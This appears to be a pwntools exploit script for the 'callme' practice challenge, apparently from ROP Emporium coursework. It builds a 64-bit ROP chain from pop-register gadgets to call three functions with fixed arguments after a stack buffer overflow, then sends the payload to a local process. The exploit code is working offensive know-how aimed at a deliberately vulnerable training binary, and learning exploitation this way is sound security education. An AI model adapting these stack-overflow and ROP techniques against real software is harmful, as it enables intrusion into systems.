#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template callme
from pwn import *


# Set up pwntools for the correct architecture
exe = context.binary = ELF('callme')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)
# RUNPATH:  '.'

io = start()

# Refer to taesoo class material

# pause()

callme_one = p64(0x400720)
callme_two = p64(0x400740)
callme_three = p64(0x4006f0)

p_one = p64(0xdeadbeefdeadbeef)
p_two = p64(0xcafebabecafebabe)
p_three = p64(0xd00df00dd00df00d)

poprdi = p64(0x00000000004009a3)  # pop rdi; ret; 
poprsi = p64(0x00000000004009a1)  # pop rsi; pop r15; ret;
poprdx = p64(0x000000000040093e)  # pop rdx; ret;

aags = ""
aags += poprdi
aags += p_one
aags += poprsi
aags += p_two
aags += p_two  # dummy for r15
aags += poprdx
aags += p_three

buf = ""
buf += "A"*40

# callme_one
buf += aags
buf += callme_one

#callme_two
buf += aags
buf += callme_two

# callme_three
buf += aags
buf += callme_three


print(buf)
write('in.txt', buf)
io.sendline(buf)
io.interactive()

# python callme64.py DEBUG

